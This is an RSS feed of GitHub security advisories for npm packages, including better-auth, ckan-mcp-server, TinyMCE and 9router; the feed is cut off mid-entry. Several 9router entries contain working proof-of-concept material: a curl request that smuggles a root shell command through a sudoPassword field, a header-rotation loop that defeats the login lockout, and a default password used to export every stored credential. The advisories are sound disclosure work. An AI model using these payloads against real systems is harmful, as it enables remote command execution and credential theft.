<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-07-07T20:43:56.825Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[better-auth] Better Auth: OAuth refresh-token replay via missing client authentication on oidc-provider and mcp plugins]]></title>
        <id>https://github.com/advisories/GHSA-pw9m-5jxm-xr6h</id>
        <link href="https://github.com/advisories/GHSA-pw9m-5jxm-xr6h"/>
        <updated>2026-07-07T20:11:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="am-i-affected">Am I affected?</h3>
<p>Users are affected if all of the following are true:</p>
<ul>
<li>Their application uses <code>better-auth</code> and has enabled at least one of: <code>oidcProvider()</code> (imported from <code>better-auth/plugins/oidc-provider</code>), or <code>mcp()</code> (imported from <code>better-auth/plugins/mcp</code>).</li>
<li>Their application has at least one confidential OAuth client registered (any client with <code>type: "web" | "native" | "user-agent-based"</code> in the <code>oauthApplication</code> table, or any <code>trustedClients</code> entry without <code>type: "public"</code>). Public clients with PKCE are not affected.</li>
<li>Their application uses <code>better-auth</code> at a version below the patched release.</li>
</ul>
<p>If an application only uses <code>@better-auth/oauth-provider</code> (the canonical replacement for <code>oidc-provider</code>) and the <code>mcp</code> plugin is not enabled, it is not affected.</p>
<p>Fix:</p>
<ol>
<li>Upgrade to <code>better-auth@1.6.11</code> or later.</li>
<li>Migrate from the deprecated <code>oidcProvider()</code> to <code>@better-auth/oauth-provider</code> when feasible. The new package enforces client authentication on both grants by default.</li>
<li>If developers cannot upgrade their applications, see workarounds below.</li>
</ol>
<h3 id="summary">Summary</h3>
<p>The legacy <code>oidcProvider</code> and <code>mcp</code> plugins each expose an OAuth 2.0 token endpoint whose <code>refresh_token</code> grant authenticates the request entirely on possession of the bound <code>refreshToken</code> row and a matching <code>client_id</code>. Neither plugin verifies the registered confidential client's <code>client_secret</code> on the refresh path. An attacker who obtains any valid <code>refresh_token</code> (via database read, log capture, browser-side XSS, or CORS-amplified script in the mcp case) and the public <code>client_id</code> can mint fresh access tokens and rotated refresh tokens until the chain is revoked.</p>
<h3 id="details">Details</h3>
<p>RFC 6749 §6 and OAuth 2.1 §4.3 require confidential clients to authenticate to the token endpoint on every grant, including refresh. The same plugins' <code>authorization_code</code> grant correctly enforces <code>client_secret</code> (the oidc-provider via <code>verifyStoredClientSecret</code>, the mcp plugin via raw equality), which proves the omission on the refresh path is a regression rather than a design choice.</p>
<p>Token rotation issues a new <code>refresh_token</code> with each call, so a single leaked refresh-token grants indefinite access until the row is revoked or its <code>refreshTokenExpiresAt</code> (default 7 days) passes; rotation refreshes that window each call.</p>
<p>Two adjacent issues on the mcp surface ship in the same patch. The mcp <code>authorization_code</code> grant uses raw <code>===</code> for client-secret comparison and ignores the <code>storeClientSecret: "encrypted" | "hashed"</code> configuration; the fix routes both grants through <code>verifyStoredClientSecret</code>. The mcp <code>/mcp/token</code> endpoint sets <code>Access-Control-Allow-Origin: *</code> unconditionally, which amplifies the refresh bypass in browser contexts; the fix narrows the CORS allowlist.</p>
<p>The newer <code>@better-auth/oauth-provider</code> package routes both grants through <code>validateClientCredentials</code> and is not affected.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>better-auth@1.6.11</code>. The legacy <code>oidcProvider</code> and <code>mcp</code> token endpoints now require <code>client_secret</code> on the <code>refresh_token</code> grant for confidential clients, using the same constant-time comparison the <code>authorization_code</code> grant already used. Public clients are unaffected (they have no secret to enforce, and PKCE substitutes on the auth-code grant).</p>
<p>The <code>Authorization: Basic</code> parser is fixed to follow RFC 6749 §2.3.1: the credential is split on the first colon and each half is percent-decoded. Client IDs and secrets that contain reserved characters now authenticate correctly. The <code>/mcp/token</code> endpoint's CORS configuration is narrowed in the same change (the wildcard <code>Access-Control-Allow-Origin: *</code> header is removed), matching the standalone <code>@better-auth/oauth-provider</code> package.</p>
<p>The deprecated <code>oidc-provider</code> plugin remains deprecated. The recommended migration path is <code>@better-auth/oauth-provider</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None of these close the bug fully without a code patch.</p>
<ul>
<li><strong>Migrate to <code>@better-auth/oauth-provider</code></strong> if your deployment can adopt the new plugin. It enforces <code>client_secret</code> on both grants.</li>
<li><strong>Force all clients to public + PKCE</strong>: set every client's <code>type: "public"</code> and require PKCE. The bug is unreachable when there is no <code>client_secret</code> to verify.</li>
<li><strong>Network-layer ingress restriction</strong>: limit <code>/api/auth/oauth2/token</code> and <code>/api/auth/mcp/token</code> to known client IPs at the load balancer. Practical for server-to-server flows, not for end-user-device clients.</li>
<li><strong>Out-of-band refresh-token rotation</strong>: on any suspicion of leak, run <code>db.deleteMany({ model: "oauthAccessToken", where: [{ field: "clientId", value: &lt;id&gt; }] })</code> to invalidate all refresh tokens for the affected client.</li>
<li><strong>For the mcp endpoint specifically</strong>: drop the wildcard CORS at an upstream proxy and replace with a tight allowlist.</li>
</ul>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Indefinite confidential-client impersonation</strong>: an attacker holding any valid <code>refresh_token</code> and the public <code>client_id</code> can mint access tokens and rotated refresh tokens indefinitely, until the row is revoked. Rotation refreshes the expiration window each call.</li>
<li><strong>Resource access at the user's authorized scope</strong>: every minted access token carries the original user's authorization scope, so the attacker reads or writes whatever the resource server grants for that scope.</li>
</ul>
<h3 id="credit">Credit</h3>
<p>Reported by @subhanUmer.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/306.html">CWE-306: Missing Authentication for Critical Function</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/345.html">CWE-345: Insufficient Verification of Data Authenticity</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/863.html">CWE-863: Incorrect Authorization</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc6749#section-6">RFC 6749 §6: Refreshing an Access Token</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1#section-4.3">OAuth 2.1 §4.3: Refresh Token</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/better-auth/better-auth/security/advisories/GHSA-pw9m-5jxm-xr6h">https://github.com/better-auth/better-auth/security/advisories/GHSA-pw9m-5jxm-xr6h</a></li>
<li><a href="https://github.com/better-auth/better-auth/releases/tag/v1.6.11">https://github.com/better-auth/better-auth/releases/tag/v1.6.11</a></li>
<li><a href="https://github.com/advisories/GHSA-pw9m-5jxm-xr6h">https://github.com/advisories/GHSA-pw9m-5jxm-xr6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pw9m-5jxm-xr6h</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-07T20:11:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@aborruso/ckan-mcp-server] @aborruso/ckan-mcp-server: SSRF via base_url allows access to internal networks (Potential fix bypass of CVE-2026-33060)]]></title>
        <id>https://github.com/advisories/GHSA-g84h-j7jj-x32p</id>
        <link href="https://github.com/advisories/GHSA-g84h-j7jj-x32p"/>
        <updated>2026-07-07T19:35:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A known vulnerability CVE-2026-33060 indicated tools including ckan_package_search and sparql_query that accept a base_url parameter had the risk of making HTTP requests to arbitrary endpoints without restriction. A fix was applied to filter out ip addresses. However, a method to bypass exists.</p>
<h3 id="details">Details</h3>
<p>CKAN MCP Server validates caller-supplied CKAN server URLs by inspecting only the parsed hostname string before issuing outbound HTTP requests. In <code>src/utils/http.ts</code>, hostname aliases such as <code>ip6-localhost</code> are not equal to <code>localhost</code>, are not dotted IPv4 literals, and are not bracketed IPv6 literals, so they pass the SSRF filter but can resolve to loopback when the server performs the request. A remote MCP caller that can invoke CKAN tools with a <code>server_url</code> can therefore make the server connect to local or private addresses and, for CKAN-shaped responses, receive response-derived data.</p>
<h3 id="fix">Fix</h3>
<p>Replaced the single <code>hostname === 'localhost'</code> check with a blocked-hostname <code>Set</code> covering <code>ip6-localhost</code> and <code>ip6-loopback</code>. Patched in commit <code>c761045a1b7c5f40d2626540dd2ef1d4feb91f8c</code>.</p>
<hr>
<p>@aborruso/ckan-mcp-server thanks <strong>hibrian827</strong> for responsibly disclosing this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ondata/ckan-mcp-server/security/advisories/GHSA-g84h-j7jj-x32p">https://github.com/ondata/ckan-mcp-server/security/advisories/GHSA-g84h-j7jj-x32p</a></li>
<li><a href="https://github.com/advisories/GHSA-3xm7-qw7j-qc8v">https://github.com/advisories/GHSA-3xm7-qw7j-qc8v</a></li>
<li><a href="https://github.com/ondata/ckan-mcp-server/releases/tag/v0.4.106">https://github.com/ondata/ckan-mcp-server/releases/tag/v0.4.106</a></li>
<li><a href="https://github.com/advisories/GHSA-g84h-j7jj-x32p">https://github.com/advisories/GHSA-g84h-j7jj-x32p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g84h-j7jj-x32p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-07T19:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[9router] 9router: Missing Authorization and OS Command Injection]]></title>
        <id>https://github.com/advisories/GHSA-g6g7-pvmx-m74p</id>
        <link href="https://github.com/advisories/GHSA-g6g7-pvmx-m74p"/>
        <updated>2026-07-07T18:35:36.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthenticated-rce-via-apitunneltailscale-install">Unauthenticated RCE via <code>/api/tunnel/tailscale-install</code></h1>
<p><strong>Affected:</strong> <code>9router</code> (npm package) — current master (<code>v0.4.39</code>).</p>
<h3 id="summary">Summary</h3>
<p><code>POST /api/tunnel/tailscale-install</code> accepts a JSON body with a <code>sudoPassword</code> field and pipes it, followed by the body of <code>https://tailscale.com/install.sh</code>, into a child process spawned as <code>sudo -S sh</code>. The route is not present in the dashboard middleware matcher in <code>src/proxy.js</code>, so the request reaches the handler without invoking <code>dashboardGuard.proxy()</code>. In deployments where the Node process runs as root (Docker images derived from <code>node:*</code> without a <code>USER</code> directive, <code>npm i -g 9router</code> invoked as root, or <code>systemd</code> units without <code>User=</code>), the spawned <code>sh</code> runs as root and executes the attacker-supplied bytes.</p>
<h3 id="details">Details</h3>
<h4 id="1-middleware-matcher-srcproxyjs3-15">1. Middleware matcher (<code>src/proxy.js:3-15</code>)</h4>
<pre><code class="language-js">export const config = {
  matcher: [
    "/",
    "/dashboard/:path*",
    "/api/shutdown",
    "/api/settings/:path*",
    "/api/keys",
    "/api/keys/:path*",
    "/api/providers/client",
    "/api/provider-nodes/validate",
    "/api/cli-tools/:path*",
    "/api/mcp/:path*",
  ],
};
</code></pre>
<p>Next.js invokes the middleware only for paths matching this list. Routes that are not listed — including the entire <code>/api/tunnel/*</code> family — do not invoke <code>dashboardGuard.proxy()</code>. No cookie, JWT, CLI token, or <code>Host</code>-header check is applied to them.</p>
<h4 id="2-route-handler-srcappapitunneltailscale-installroutejs18-67">2. Route handler (<code>src/app/api/tunnel/tailscale-install/route.js:18-67</code>)</h4>
<pre><code class="language-js">export async function POST(request) {
  const body = await request.json().catch(() =&gt; ({}));
  ...
  const sudoPassword =
    body.sudoPassword || getCachedPassword() || await loadEncryptedPassword() || "";
  ...
  const result = await installTailscale(sudoPassword, shortId, (msg) =&gt; {
    send("progress", { message: msg });
  });
  ...
}
</code></pre>
<p><code>body.sudoPassword</code> comes from the request body and is passed to <code>installTailscale</code>, which dispatches to <code>installTailscaleLinux</code> on Linux.</p>
<h4 id="3-linux-installation-routine-srclibtunneltailscalejs304-341">3. Linux installation routine (<code>src/lib/tunnel/tailscale.js:304-341</code>)</h4>
<pre><code class="language-js">async function installTailscaleLinux(sudoPassword, log) {
  log("Downloading install script...");
  return new Promise((resolve, reject) =&gt; {
    const curlChild = spawn("curl", ["-fsSL", "https://tailscale.com/install.sh"], { ... });
    let scriptContent = "";
    curlChild.stdout.on("data", (d) =&gt; { scriptContent += d.toString(); });
    curlChild.on("exit", (code) =&gt; {
      if (code !== 0) return reject(...);
      log("Running install script...");
      const child = spawn("sudo", ["-S", "sh"], { stdio: ["pipe", "pipe", "pipe"], windowsHide: true });
      ...
      child.stdin.write(`${sudoPassword}\n`);   //  ← from request body
      child.stdin.write(scriptContent);
      child.stdin.end();
    });
  });
}
</code></pre>
<p>The byte stream sent to the stdin of the <code>sudo -S sh</code> child process is:</p>
<pre><code>&lt;sudoPassword from request body&gt;\n
&lt;https://tailscale.com/install.sh body&gt;
</code></pre>
<p>When the caller is already root, has <code>NOPASSWD</code> configured for the user, or has a recent sudo timestamp cache, <code>sudo -S sh</code> does not read stdin for a password — it <code>exec</code>s <code>sh</code> directly. The new <code>sh</code> process inherits the stdin pipe and reads it line by line:</p>
<ol>
<li>The <code>sudoPassword</code> value from the request — interpreted as the first shell command.</li>
<li>The <code>install.sh</code> body — interpreted as subsequent shell input.</li>
</ol>
<p>Appending <code>; exit 0</code> to the <code>sudoPassword</code> value causes <code>sh</code> to exit before the legitimate <code>install.sh</code> body runs. The host executes only the request-supplied bytes, as the 9router process user.</p>
<p>Both "Docker container running as root" and "<code>npm i -g 9router</code> on a host with <code>NOPASSWD</code> sudo" reach this path.</p>
<h3 id="poc">PoC</h3>
<p>The reproduction below is self-contained: build a representative target image (Node process running as root, with <code>sudo</code> and <code>curl</code> on <code>PATH</code>), start it, send one unauthenticated POST with <code>curl</code>, and read the file written by the payload.</p>
<p><strong>Step 1 — build the target image</strong></p>
<pre><code class="language-sh">docker build -t 9router-vuln-root - &lt;&lt;'EOF'
FROM node:22-bookworm-slim
RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
        sudo curl ca-certificates \
    &amp;&amp; rm -rf /var/lib/apt/lists/*
RUN npm install -g 9router@0.4.39
EXPOSE 20128
CMD ["9router"]
EOF
</code></pre>
<p><strong>Step 2 — start the target</strong></p>
<pre><code class="language-sh">docker run -d --rm --name target -p 127.0.0.1:20129:20128 \
    9router-vuln-root 9router --log --skip-update
until curl -fs -o /dev/null http://127.0.0.1:20129/api/health; do sleep 1; done
</code></pre>
<p><strong>Step 3 — exploit (one unauthenticated POST)</strong></p>
<pre><code class="language-sh">curl -sN -X POST http://127.0.0.1:20129/api/tunnel/tailscale-install \
     -H 'Content-Type: application/json' \
     -d '{"sudoPassword":"id &gt; /tmp/pwned.txt; exit 0"}'
</code></pre>
<p><strong>Step 4 — verify</strong></p>
<pre><code class="language-sh">docker exec target cat /tmp/pwned.txt
# uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>The trailing <code>"Tailscale not installed"</code> line is a consequence of <code>; exit 0</code> terminating <code>sh</code> before the legitimate <code>install.sh</code> body executed; the <code>id &gt; /tmp/pwned.txt</code> write completed earlier in the same <code>sh</code> invocation. The POST carried no credentials, cookies, or prior state.</p>
<h3 id="impact">Impact</h3>
<p><strong>Type:</strong> Improper Access Control + OS Command Injection (CWE-862 + CWE-78).</p>
<p><strong>Affected operators:</strong> 9router operators on Linux/macOS whose deployment matches one of the following configurations:</p>
<table>
<thead>
<tr>
<th>Configuration</th>
<th>Example</th>
<th>Outcome</th>
</tr>
</thead>
<tbody><tr>
<td>Node process runs as root</td>
<td>Custom <code>Dockerfile</code> without <code>USER</code>, <code>systemd</code> unit without <code>User=</code>, <code>sudo npm i -g 9router &amp;&amp; sudo 9router</code></td>
<td>Unauthenticated remote root RCE (primary case in this report)</td>
</tr>
<tr>
<td>Node process runs as a normal user with <code>NOPASSWD</code> sudo</td>
<td>Developer laptop, CI runner, or single-tenant VPS where the operator's user has <code>NOPASSWD: ALL</code></td>
<td>Unauthenticated remote RCE as the operator's user; root reachable via <code>sudo</code> from the foothold</td>
</tr>
<tr>
<td>Node process runs as a normal user without <code>NOPASSWD</code> and no stored password</td>
<td>Hardened multi-user host</td>
<td>The spawn runs but <code>sudo</code> rejects the supplied value. No RCE; the request still triggers an outbound fetch from <code>tailscale.com</code> and the SSE error stream reveals platform information</td>
</tr>
</tbody></table>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/decolua/9router/security/advisories/GHSA-g6g7-pvmx-m74p">https://github.com/decolua/9router/security/advisories/GHSA-g6g7-pvmx-m74p</a></li>
<li><a href="https://github.com/decolua/9router/releases?q=0.4.44&amp;expanded=true">https://github.com/decolua/9router/releases?q=0.4.44&amp;expanded=true</a></li>
<li><a href="https://github.com/advisories/GHSA-g6g7-pvmx-m74p">https://github.com/advisories/GHSA-g6g7-pvmx-m74p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g6g7-pvmx-m74p</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-02T20:17:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tinymce] TinyMCE Cross-Site Scripting (XSS) vulnerability using through data-mce- prefixed src, href, style attributes]]></title>
        <id>https://github.com/advisories/GHSA-q742-qvgc-gc2f</id>
        <link href="https://github.com/advisories/GHSA-q742-qvgc-gc2f"/>
        <updated>2026-07-07T17:10:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Stored XSS vulnerability via unsanitized data-mce-* attributes (data-mce-href, data-mce-src, data-mce-style). Allows attackers to inject malicious values that override safe attributes during serialization, bypassing validation.</p>
<h3 id="patches">Patches</h3>
<p>Patched by stripping unsafe data-mce-* attributes during parsing. Users should upgrade to the latest patched versions (5 LTS, 7.x, 8.x).</p>
<h3 id="workarounds">Workarounds</h3>
<p>No official workaround available.</p>
<h3 id="fix">Fix</h3>
<p>To avoid this vulnerability:</p>
<p>Upgrade to TinyMCE 8.5.1 or higher.
Upgrade to TinyMCE 7.9.3 or higher.
Upgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial <a href="https://www.tiny.cloud/long-term-support/">long-term support</a> contract).</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>Tiny thanks <a href="https://github.com/mtrill47">Tadi Kadango</a> (<a href="https://tadiwakadango.com/">website</a>)  and <a href="https://github.com/he1d3n">Ivan Babenko</a> for their help identifying this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tinymce/tinymce/security/advisories/GHSA-q742-qvgc-gc2f">https://github.com/tinymce/tinymce/security/advisories/GHSA-q742-qvgc-gc2f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-47759">https://nvd.nist.gov/vuln/detail/CVE-2026-47759</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview</a></li>
<li><a href="https://github.com/advisories/GHSA-q742-qvgc-gc2f">https://github.com/advisories/GHSA-q742-qvgc-gc2f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q742-qvgc-gc2f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-05T20:27:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[9router] 9router: Login brute-force protection bypass via spoofed X-Forwarded-For header]]></title>
        <id>https://github.com/advisories/GHSA-7cfm-pqrj-xgq7</id>
        <link href="https://github.com/advisories/GHSA-7cfm-pqrj-xgq7"/>
        <updated>2026-07-06T21:46:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The 9router dashboard login rate limiter derives the client identity from the attacker-controlled <code>X-Forwarded-For</code> HTTP header. When 9router is directly exposed, or deployed behind a reverse proxy that does not overwrite untrusted forwarding headers, a remote attacker can rotate the <code>X-Forwarded-For</code> value on each login attempt and receive a fresh rate-limit bucket every time.</p>
<p>This bypasses the dashboard brute-force protection and makes the login lockout mechanism ineffective.</p>
<h2 id="details">Details</h2>
<table>
<thead>
<tr>
<th>Component</th>
<th>File</th>
<th>Note</th>
</tr>
</thead>
<tbody><tr>
<td>Dashboard login rate limiter</td>
<td><code>src/lib/auth/loginLimiter.js</code></td>
<td>Uses <code>X-Forwarded-For</code> as the client identity without a trusted-proxy check</td>
</tr>
<tr>
<td>Dashboard login route</td>
<td><code>src/app/api/auth/login/route.js</code></td>
<td>Calls <code>checkLock()</code> and <code>recordFail()</code> using the spoofable client identity</td>
</tr>
</tbody></table>
<h4 id="vulnerable-code">Vulnerable Code</h4>
<p><code>src/lib/auth/loginLimiter.js</code>:</p>
<pre><code class="language-js">export function getClientIp(request) {
  const xff = request.headers.get("x-forwarded-for");
  if (xff) return xff.split(",")[0].trim();
  return request.headers.get("x-real-ip") || "unknown";
}
</code></pre>
<p>The returned value is used as the key for the in-memory rate-limit state:</p>
<pre><code class="language-js">const attempts = new Map(); // ip -&gt; { fails, lockUntil, lockLevel, lastFailAt }
</code></pre>
<p>The login route uses this value when checking and recording failed login attempts:</p>
<pre><code class="language-js">export async function POST(request) {
  const ip = getClientIp(request);
  const lock = checkLock(ip);

  if (lock.locked) {
    return NextResponse.json(
      { error: `Too many failed attempts. Try again in ${lock.retryAfter}s.` },
      { status: 429 }
    );
  }

  // ... password validation ...

  recordFail(ip);
}
</code></pre>
<p>Because <code>X-Forwarded-For</code> is accepted directly from the request, each unique header value creates a new rate-limit bucket with zero previous failures. An attacker can therefore bypass both the 5-attempt threshold and the progressive lockout durations.</p>
<h2 id="poc">PoC</h2>
<h3 id="step-1--baseline-rate-limiter-triggers-when-the-client-identity-is-stable">Step 1 — Baseline: rate limiter triggers when the client identity is stable</h3>
<p>Send repeated failed login attempts with the same <code>X-Forwarded-For</code> value:</p>
<pre><code class="language-http">POST /api/auth/login HTTP/1.1
Host: localhost:20128
Content-Type: application/json
X-Forwarded-For: 1.1.1.1

{"password":"wrong-password"}
</code></pre>
<p>Observed behavior:</p>
<table>
<thead>
<tr>
<th>Attempt</th>
<th>Response</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><code>Invalid password. 4 attempt(s) left before lockout.</code></td>
</tr>
<tr>
<td>2</td>
<td><code>Invalid password. 3 attempt(s) left before lockout.</code></td>
</tr>
<tr>
<td>3</td>
<td><code>Invalid password. 2 attempt(s) left before lockout.</code></td>
</tr>
<tr>
<td>4</td>
<td><code>Invalid password. 1 attempt(s) left before lockout.</code></td>
</tr>
<tr>
<td>5</td>
<td><code>Too many failed attempts. Try again in 30s.</code></td>
</tr>
<tr>
<td>6</td>
<td><code>Too many failed attempts. Try again in 30s.</code></td>
</tr>
</tbody></table>
<p>This confirms that the lockout logic works when all attempts are assigned to the same rate-limit bucket.</p>
<h3 id="step-2--bypass-rotate-x-forwarded-for-on-each-request">Step 2 — Bypass: rotate <code>X-Forwarded-For</code> on each request</h3>
<p>Send failed login attempts while changing the <code>X-Forwarded-For</code> value for every request:</p>
<pre><code class="language-bash">for i in $(seq 1 10); do
  curl -s -X POST "http://localhost:20128/api/auth/login" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"password":"wrong-password"}'
  echo
done
</code></pre>
<p>Observed response for every request:</p>
<pre><code class="language-json">{
  "error": "Invalid password. 4 attempt(s) left before lockout.",
  "remainingBeforeLock": 4
}
</code></pre>
<p>The counter resets to the initial state on every request, and the lockout is never triggered.</p>
<h3 id="step-3--impact-amplifier-default-dashboard-password">Step 3 — Impact amplifier: default dashboard password</h3>
<p>If the instance is still using the default dashboard password, the rate-limit bypass allows an attacker to avoid lockout while attempting to authenticate.</p>
<p>Example request:</p>
<pre><code class="language-http">POST /api/auth/login HTTP/1.1
Host: localhost:20128
Content-Type: application/json
X-Forwarded-For: 99.99.99.99

{"password":"&lt;default-dashboard-password&gt;"}
</code></pre>
<p>Observed response on a default installation:</p>
<pre><code class="language-http">HTTP/1.1 200 OK
Set-Cookie: auth_token=&lt;redacted&gt;; Path=/; HttpOnly; SameSite=lax
</code></pre>
<pre><code class="language-json">{
  "success": true
}
</code></pre>
<p>The default password is an impact amplifier, not the root cause. Even if an administrator changes the password, the rate limiter remains structurally bypassable because the attacker controls the rate-limit key.</p>
<h2 id="attack-scenario">Attack Scenario</h2>
<ol>
<li>A remote attacker identifies a publicly reachable 9router dashboard.</li>
<li>The attacker sends repeated login attempts to <code>/api/auth/login</code>.</li>
<li>For each attempt, the attacker changes the <code>X-Forwarded-For</code> header value.</li>
<li>9router treats each request as a different client and assigns a fresh rate-limit bucket.</li>
<li>The attacker can continue brute-force attempts without triggering the configured lockout.</li>
<li>If the instance uses a weak or default dashboard password, the attacker can gain administrative access.</li>
</ol>
<h2 id="impact">Impact</h2>
<p>A successful attacker can bypass the dashboard login lockout mechanism and perform unlimited brute-force attempts against the 9router dashboard password.</p>
<p>If authentication succeeds, the attacker can gain administrative access to the 9router dashboard and may be able to:</p>
<ul>
<li>Access configured provider credentials and API keys.</li>
<li>Change dashboard and authentication settings.</li>
<li>Disable login protection if the application allows it.</li>
<li>Create persistent API keys or other long-lived access tokens.</li>
<li>Modify application configuration.</li>
<li>Chain the access with other server-side functionality exposed by the dashboard.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/decolua/9router/security/advisories/GHSA-7cfm-pqrj-xgq7">https://github.com/decolua/9router/security/advisories/GHSA-7cfm-pqrj-xgq7</a></li>
<li><a href="https://github.com/advisories/GHSA-7cfm-pqrj-xgq7">https://github.com/advisories/GHSA-7cfm-pqrj-xgq7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7cfm-pqrj-xgq7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-06T21:46:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[9router] 9routers has Exposure of Sensitive Information and Unprotected Database Import/Export, Allowing Complete Credential Theft and Database Takeover]]></title>
        <id>https://github.com/advisories/GHSA-qvfm-67h2-2qfx</id>
        <link href="https://github.com/advisories/GHSA-qvfm-67h2-2qfx"/>
        <updated>2026-07-06T21:37:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>/api/settings/database</code> endpoint allows full database export (containing all credentials, API keys, OAuth tokens, and settings) and full database import (complete overwrite) without any authentication requirement beyond the <code>ALWAYS_PROTECTED</code> middleware check, which only validates JWT or CLI token. Combined with other vulnerabilities (e.g., default password, tunnel exposure), this enables complete database takeover.</p>
<h2 id="description">Description</h2>
<p>The endpoint <code>/api/settings/database</code> is listed in <code>ALWAYS_PROTECTED</code> in <code>dashboardGuard.js</code> (line 42), which requires a valid JWT token or CLI token. However, this protection is insufficient because:</p>
<ol>
<li><p><strong>GET (Export):</strong> Returns the complete database including API keys (<code>key</code> field in <code>apiKeys</code> table), OAuth tokens, and all provider credentials. Line 80 in <code>src/lib/db/index.js</code>: <code>apiKeys: db.all("SELECT * FROM apiKeys").map(...)</code> — the <code>key</code> field contains the plaintext API key value.</p>
</li>
<li><p><strong>POST (Import):</strong> Accepts arbitrary JSON and performs a complete database wipe-and-replace in a transaction (lines 102-163 in <code>src/lib/db/index.js</code>). This replaces all settings including the password hash, effectively allowing an attacker to set their own password.</p>
</li>
<li><p>The exported data includes <code>apiKeys</code> with their plaintext <code>key</code> values, <code>providerConnections</code> with all OAuth tokens, and <code>settings</code> with OIDC client secrets.</p>
</li>
</ol>
<h3 id="evidence">Evidence</h3>
<p><strong>File:</strong> <code>src/app/api/settings/database/route.js</code></p>
<pre><code class="language-javascript">export async function GET() {
  const payload = await exportDb();
  return NextResponse.json(payload);
}

export async function POST(request) {
  const payload = await request.json();
  await importDb(payload);
  // ...
}
</code></pre>
<p><strong>File:</strong> <code>src/lib/db/index.js</code> (lines 96-163)</p>
<pre><code class="language-javascript">export async function importDb(payload) {
  db.transaction(() =&gt; {
    // Wipe all tables
    db.run(`DELETE FROM settings`);
    db.run(`DELETE FROM providerConnections`);
    db.run(`DELETE FROM providerNodes`);
    db.run(`DELETE FROM proxyPools`);
    db.run(`DELETE FROM apiKeys`);
    db.run(`DELETE FROM combos`);
    db.run(`DELETE FROM kv WHERE scope IN (...)`);
    // Then insert attacker-controlled data
    // ...
  });
}
</code></pre>
<p>The <code>exportDb</code> function at line 80 exposes API key plaintext:</p>
<pre><code class="language-javascript">apiKeys: db.all(`SELECT * FROM apiKeys`).map((r) =&gt; ({ 
  id: r.id, key: r.key, name: r.name, ...
})),
</code></pre>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li>Authenticate with any valid JWT (e.g., using the default password "123456")</li>
<li>Export: <code>curl -b auth_token=&lt;jwt&gt; http://localhost:20128/api/settings/database</code></li>
<li>Observe: Full database dump with all credentials in plaintext</li>
